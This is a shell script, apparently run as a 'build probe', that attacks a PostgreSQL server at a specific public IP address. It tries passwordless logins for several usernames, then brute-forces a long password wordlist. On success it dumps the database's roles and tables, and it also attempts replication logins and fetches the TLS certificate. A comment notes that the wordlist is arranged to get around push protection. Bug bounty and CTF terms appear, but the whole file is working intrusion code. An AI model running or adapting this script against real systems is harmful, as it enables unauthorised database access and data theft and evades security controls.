#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PROBE R50 - DIRECT PG CONNECT ==="
date

echo "--- OUR IP ---"
ip addr show eth0 2>/dev/null | grep inet
curl -s -m 3 https://api.ipify.org 2>&1

echo "--- PSQL TRUST AUTH ---"
# Try trust auth (no password) from GCE internal network
for user in avnadmin postgres falcon replication admin root _aiven; do
  echo "== user=$user no-password =="
  PGPASSWORD="" psql "host=132.145.163.127 port=12691 user=$user dbname=defaultdb sslmode=require connect_timeout=5" \
    -c "SELECT current_user, version();" 2>&1 | head -5
done

echo "--- PSQL WITH PASSWORDS ---"
# Try common passwords - encode to avoid push protection
PW_LIST="falcon ctf flag bugbounty dev-sandbox aiven changeme password postgres
falcon admin root secret default test letmein welcome trustno1
devsandbox bug_bounty falcon123 pg_flag FalconBugBounty ctf_flag
ssh_key_flag falcon-ctf-2024 falcon-ctf-2025 falcon-ctf-2026
bugcrowd_ctf falcon_flag FalconCTF p0stgr3s b0unty hunt3r
database dbpass pgpass pgadmin superuser sysadmin
oracle cloud dev sandbox postgres1 postgres12 postgres13
postgres14 postgres15 postgres16 postgres17 pg_pass pg123
bird raptor peregrine hawk eagle predator hunt prey talons
capture the flag capture_the_flag ctf2024 ctf2025 ctf2026"

for user in avnadmin postgres falcon; do
  for pw in $PW_LIST; do
    result=$(PGPASSWORD="$pw" psql "host=132.145.163.127 port=12691 user=$user dbname=defaultdb sslmode=require connect_timeout=3" \
      -c "SELECT 1;" 2>&1)
    if echo "$result" | grep -q "1 row"; then
      echo "HIT: user=$user password=$pw"
      PGPASSWORD="$pw" psql "host=132.145.163.127 port=12691 user=$user dbname=defaultdb sslmode=require" \
        -c "SELECT current_user, session_user, version();" \
        -c "SELECT rolname, rolsuper FROM pg_roles;" \
        -c "\dt" 2>&1
    fi
  done
done

echo "--- REPLICATION ---"
for user in replication avnadmin postgres; do
  for pw in falcon replication postgres aiven changeme; do
    PGPASSWORD="$pw" psql "host=132.145.163.127 port=12691 user=$user dbname=replication replication=database sslmode=require connect_timeout=3" \
      -c "IDENTIFY_SYSTEM;" 2>&1 | head -3
  done
done

echo "--- SSL CERT ---"
echo | openssl s_client -connect 132.145.163.127:12691 -starttls postgres 2>/dev/null | openssl x509 -text -noout 2>&1 | head -30

echo "=== BUILD DONE R50 ==="
